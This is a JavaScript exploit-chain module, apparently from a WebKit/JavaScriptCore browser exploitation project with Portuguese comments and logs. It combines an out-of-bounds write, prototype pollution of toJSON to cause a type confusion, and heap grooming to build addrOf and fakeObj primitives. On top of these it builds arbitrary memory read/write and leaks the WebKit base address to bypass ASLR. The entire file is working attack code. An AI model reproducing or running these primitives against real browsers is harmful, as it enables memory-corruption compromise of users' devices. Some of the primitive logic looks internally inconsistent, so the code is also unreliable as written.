// js/script3/testArrayBufferVictimCrash.mjs (v84_CorruptedArrayLeak_Groomed - R45 - Heap Grooming)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V84_CALHG_R45_WEBKIT = "Heisenbug_CorruptedArrayLeak_v84_CALHG_R45_WebKitLeak";

// --- Configurações do Teste ---
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C;
const OOB_WRITE_VALUES_V84 = [0x41414141, 0xABABABAB];

// --- Globais para a primitiva de exploit ---
let corrupting_array = null;
let corrupted_array = null;
let addrOf_primitive = null;
let fakeObj_primitive = null;
let arb_read_v2 = null;
let arb_write_v2 = null;
// ---

let targetFunctionForLeak;
let leaked_target_function_addr = null;

function isValidPointer(ptr) {
    if (!isAdvancedInt64Object(ptr)) return false;
    const high = ptr.high();
    const low = ptr.low();
    if (high === 0 && low === 0) return false;
    if (high === 0 && low < 0x10000) return false;
    return true;
}

const conversion_buffer = new ArrayBuffer(8);
const float_conversion_view = new Float64Array(conversion_buffer);
const int_conversion_view = new BigUint64Array(conversion_buffer);

function box(addr) {
    int_conversion_view[0] = BigInt(addr.toString());
    return float_conversion_view[0];
}

function unbox(float_val) {
    float_conversion_view[0] = float_val;
    return new AdvancedInt64(int_conversion_view[0]);
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R45() { // Nome atualizado para R45
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V84_CALHG_R45_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: TC + Groomed CorruptedArray Addrof (R45) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init R45...`;

    targetFunctionForLeak = function someUniqueLeakFunctionR45_Instance() { return `target_R45_${Date.now()}`; };
    logS3(`Função alvo para addrof (targetFunctionForLeak) recriada.`, 'info');

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null,
        addrof_result: { success: false, msg: "Addrof (R45): Not run." },
        webkit_leak_result: { success: false, msg: "WebKit Leak (R45): Not run." },
        oob_value_used: null,
        heisenbug_on_M2_confirmed_by_tc_probe: false
    };

    for (const current_oob_value of OOB_WRITE_VALUES_V84) {
        corrupting_array = corrupted_array = addrOf_primitive = fakeObj_primitive = arb_read_v2 = arb_write_v2 = null;
        leaked_target_function_addr = null;
        let heisenbugConfirmedThisIter = false;
        let iter_addrof_result = { success: false, msg: "Addrof (R45): Not run in this iter." };
        let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R45): Not run in this iter." };
        let iter_primary_error = null;
        let M2_ref_iter_from_probe = null;

        const current_oob_hex_val = toHex(current_oob_value);
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_OOB${current_oob_hex_val}`;
        logS3(`\n===== ITERATION R45: OOB Write Value: ${current_oob_hex_val} =====`, "subtest", FNAME_CURRENT_ITERATION);

        function toJSON_HG_Probe_Iter_Closure_R45() { // 'HG' de Heap Grooming
            const ctts = Object.prototype.toString.call(this);
            if (this === M2_ref_iter_from_probe && ctts === '[object Object]') {
                try {
                    // [NOVA ESTRATÉGIA R45 - HEAP GROOMING]
                    logS3(`[PROBE_R45] TC Detectada! 'this' é M2. INICIANDO HEAP GROOMING...`, "vuln");
                    const GROOM_COUNT = 500; // Alocaremos 500 arrays para aumentar a chance
                    this.grooming_pad = new Array(GROOM_COUNT);

                    for (let i = 0; i < GROOM_COUNT; i++) {
                        this.grooming_pad[i] = new Float64Array(1);
                    }

                    // Escolhemos arrays do meio do bloco como nossos alvos.
                    // A chance de um deles ter sido alocado no local corrompido é muito maior agora.
                    this.corrupting_array = this.grooming_pad[Math.floor(GROOM_COUNT / 2) - 1];
                    this.corrupted_array = this.grooming_pad[Math.floor(GROOM_COUNT / 2)];

                    heisenbugConfirmedThisIter = true;
                    logS3(`[PROBE_R45] Heap Grooming concluído. ${GROOM_COUNT} arrays criados.`, "debug");
                    
                } catch (e) {
                     logS3(`[PROBE_R45] Erro durante o Heap Grooming: ${e.message}`, "critical");
                }
                return this;
            } else if (this.is_victim_typed_array) {
                M2_ref_iter_from_probe = { marker_id_v84: "M2_Iter_R45" };
                return { marker_id_v84: "M1_Iter_R45", payload_M2: M2_ref_iter_from_probe };
            }
            return { type: ctts };
        }

        try {
            logS3(`  --- Fase 1 (R45): Detecção de Type Confusion com Heap Grooming ---`, "subtest", FNAME_CURRENT_ITERATION);
            await triggerOOB_primitive({ force_reinit: true });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, current_oob_value, 4);
            await PAUSE_S3(150);
            
            let victim_typed_array = new Uint8Array(1);
            victim_typed_array.is_victim_typed_array = true;

            const ppKey = 'toJSON';
            let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let polluted = false;

            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_HG_Probe_Iter_Closure_R45, writable: true, configurable: true, enumerable: false });
                polluted = true;
                JSON.stringify(victim_typed_array);
            } finally {
                if (polluted) {
                    if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey];
                }
            }

            if (!heisenbugConfirmedThisIter || !M2_ref_iter_from_probe?.corrupted_array) {
                throw new Error("Falha na Fase 1: A Type Confusion não ocorreu ou os arrays de sobreposição não foram criados.");
            }
            logS3(`  Fase 1 (R45) SUCESSO: Type Confusion confirmada.`, "good");

            logS3(`  --- Fase 2 (R45): Construção das Primitivas (addrOf/fakeObj) ---`, "subtest", FNAME_CURRENT_ITERATION);
            
            corrupting_array = M2_ref_iter_from_probe.corrupting_array;
            corrupted_array = M2_ref_iter_from_probe.corrupted_array;

            if (corrupted_array.length < 100) {
                 throw new Error(`A corrupção de 'length' falhou. Comprimento do corrupted_array é ${corrupted_array.length}, esperado > 100.`);
            }
            logS3(`  SUCESSO: Comprimento do 'corrupted_array' foi corrompido para: ${corrupted_array.length}`, "vuln");

            addrOf_primitive = (obj) => {
                corrupting_array[0] = obj;
                return unbox(corrupted_array[0]);
            };
            fakeObj_primitive = (addr) => {
                corrupted_array[0] = box(addr);
                return corrupting_array[0];
            };
            logS3("  Primitivas 'addrOf' e 'fakeObj' definidas.", "info");

            leaked_target_function_addr = addrOf_primitive(targetFunctionForLeak);
            logS3(`  [TESTE AddrOf] Endereço vazado de targetFunctionForLeak: ${leaked_target_function_addr.toString(true)}`, "leak");

            if (!isValidPointer(leaked_target_function_addr)) {
                throw new Error(`addrOf retornou um ponteiro inválido: ${leaked_target_function_addr.toString(true)}`);
            }
            
            const fake_func = fakeObj_primitive(leaked_target_function_addr);
            if (fake_func !== targetFunctionForLeak) {
                throw new Error("Teste de fakeObj falhou. Objeto falsificado não corresponde ao original.");
            }
            logS3("  [TESTE AddrOf/FakeObj] SUCESSO: Primitivas validadas.", "good");
            iter_addrof_result = { success: true, msg: "addrOf/fakeObj criados e validados com sucesso.", leaked_object_addr: leaked_target_function_addr.toString(true) };

            logS3(`  --- Fase 3 (R45): Leitura/Escrita Arbitrária e WebKit Base Leak ---`, "subtest", FNAME_CURRENT_ITERATION);
            
            arb_read_v2 = (addr) => {
                const fake_butterfly_addr = addr.sub(new AdvancedInt64(0, JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET));
                let fake_array = fakeObj_primitive(fake_butterfly_addr);
                return new AdvancedInt64(unbox(fake_array[0]));
            };
            arb_write_v2 = (addr, val) => {
                const fake_butterfly_addr = addr.sub(new AdvancedInt64(0, JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET));
                let fake_array = fakeObj_primitive(fake_butterfly_addr);
                fake_array[0] = box(val);
            };
            logS3("  Primitivas 'arb_read_v2' e 'arb_write_v2' definidas.", "info");
            
            const ptr_to_executable_instance = arb_read_v2(leaked_target_function_addr.add(new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET)));
            logS3(`  WebKitLeak: Ponteiro para ExecutableInstance: ${ptr_to_executable_instance.toString(true)}`, 'leak');
            if(!isValidPointer(ptr_to_executable_instance)) throw new Error("Ponteiro para ExecutableInstance inválido.");

            const ptr_to_jit_or_vm = arb_read_v2(ptr_to_executable_instance.add(new AdvancedInt64(0, 8))); // JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM
            logS3(`  WebKitLeak: Ponteiro para JIT/VM: ${ptr_to_jit_or_vm.toString(true)}`, 'leak');
            if(!isValidPointer(ptr_to_jit_or_vm)) throw new Error("Ponteiro para JIT/VM inválido.");

            const page_mask_4kb = new AdvancedInt64(0x0, ~0xFFF);
            const webkit_base_candidate = ptr_to_jit_or_vm.and(page_mask_4kb);
            
            iter_webkit_leak_result = { success: true, msg: `Candidato a base do WebKit: ${webkit_base_candidate.toString(true)}`, webkit_base_candidate: webkit_base_candidate.toString(true) };
            logS3(`  WebKitLeak: SUCESSO! ${iter_webkit_leak_result.msg}`, "vuln");

        } catch (e) {
            iter_primary_error = e;
            logS3(`  ERRO na iteração R45: ${e.message}`, "critical", FNAME_CURRENT_ITERATION);
            console.error(`Erro na iteração ${current_oob_hex_val}:`, e);
        } finally {
            await clearOOBEnvironment();
        }

        let current_iter_summary = {
            oob_value: current_oob_hex_val,
            error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
            addrof_result_this_iter: iter_addrof_result,
            webkit_leak_result_this_iter: iter_webkit_leak_result,
            heisenbug_on_M2_confirmed_by_tc_probe: heisenbugConfirmedThisIter
        };
        iteration_results_summary.push(current_iter_summary);

        if (!current_iter_summary.error && iter_webkit_leak_result.success) {
            best_result_for_runner = {
                errorOccurred: null,
                addrof_result: iter_addrof_result,
                webkit_leak_result: iter_webkit_leak_result,
                oob_value_used: current_oob_hex_val,
                heisenbug_on_M2_confirmed_by_tc_probe: heisenbugConfirmedThisIter
            };
             document.title = `${FNAME_CURRENT_TEST_BASE}_R45: WebKitLeak OK!`;
            break; 
        } else if (!current_iter_summary.error && iter_addrof_result.success && !best_result_for_runner.addrof_result.success) {
             best_result_for_runner = { ...current_iter_summary, errorOccurred: null, oob_value_used: current_oob_hex_val };
             document.title = `${FNAME_CURRENT_TEST_BASE}_R45: Addrof OK`;
        }
    }
    
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result (R45): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    return { ...best_result_for_runner, iteration_results_summary: iteration_results_summary };
}
